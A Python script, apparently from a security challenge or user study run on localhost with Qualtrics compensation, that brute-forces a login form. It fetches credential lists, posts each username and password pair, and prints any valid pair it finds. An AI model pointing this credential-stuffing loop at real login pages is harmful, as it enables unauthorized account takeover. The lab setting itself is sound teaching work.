import requests
import time
import json
from tqdm import tqdm
from bs4 import BeautifulSoup
import os

def load_credentials(url):
    response = requests.get(url)
    return [line.strip().split(':', 1) for line in response.text.split('\n') if ':' in line]

def extract_qualtrics_data(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    if qualtrics_json := soup.find('pre', id='qualtrics-json'):
        try:
            return json.loads(qualtrics_json.text)
        except json.JSONDecodeError:
            print("Error parsing Qualtrics JSON")
    return None

def write_qualtrics_output(data: dict) -> None:
    """Write the Qualtrics output to a file instead of printing it.
       If the file already exists, print a message and do not overwrite it."""
    output_file = "qualtrics_data.txt"
    output_text = (
        "Upload this file to Qualtrics to get compensation for this challenge.\n"
        + json.dumps(data, indent=2)
    )
    
    if os.path.exists(output_file):
        print(f"Output file '{os.path.abspath(output_file)}' already exists. Please upload this file to Qualtrics to get compensation for this challenge.")
    else:
        with open(output_file, "w") as f:
            f.write(output_text)
        print(f"Output file '{os.path.abspath(output_file)}' has been created. Please upload this file to Qualtrics to get compensation for this challenge.")

def process_credentials(creds_url, session, base_url):
    """Returns: (success_status, qualtrics_data)"""
    try:
        credentials = load_credentials(creds_url)
        pbar = tqdm(credentials, desc="Testing credentials")
        
        for username, password in pbar:
            response = session.post(f'{base_url}/', 
                data={'username': username, 'password': password})
            
            # Display server messages
            soup = BeautifulSoup(response.text, 'html.parser')
            for alert in soup.find_all('div', class_='alert'):
                class_list = alert.get('class', [])
                alert_type = 'Server' if 'alert-danger' in class_list or 'alert-success' in class_list else 'Warning'
                tqdm.write(f"\n{alert_type}: {alert.text.strip()}")
            
            if "Login successful" in response.text:
                pbar.close()
                print("\n\033[92mValid credentials found!\033[0m")
                print(f"\033[94mUsername: {username}\033[0m\n\033[94mPassword: {password}\033[0m")
                print(f"But now that you got the flag they were blocked from the server.\n")
                return True, extract_qualtrics_data(response.text)
                
        return False, None
    
    except KeyboardInterrupt:
        pbar.close()
        raise

def main():
    base_url = 'http://localhost:8087'
    session = requests.Session()
    list_times = {'1': 0.0, '2': 0.0}
    current_list = input("Initial credential list (1/2): ").strip()
    
    while True:
        start_time = time.time()
        
        try:
            creds_url = f'{base_url}/credentials{current_list}.txt'
            success, qualtrics_data = process_credentials(creds_url, session, base_url)
            
            # Update time for completed list
            list_times[current_list] += time.time() - start_time
            
            if success:
                total_time = sum(list_times.values())
                if qualtrics_data:
                    qualtrics_data["time_stats"] = {
                        "list_1_time": list_times['1'],
                        "list_2_time": list_times['2'],
                        "total_time": total_time
                    }
                    write_qualtrics_output(qualtrics_data)

                break
                
        except KeyboardInterrupt:
            # Capture partial time before switching
            list_times[current_list] += time.time() - start_time
            print(f"\nList 1 time: {list_times['1']:.1f}s | List 2 time: {list_times['2']:.1f}s")
            current_list = '2' if current_list == '1' else '1'
            print(f"\nSwitched to List {current_list}")
            continue
            
        # Show progress after each full list attempt
        #print(f"\nList 1: {list_times['1']:.1f}s | List 2: {list_times['2']:.1f}s")

if __name__ == "__main__":
    main()
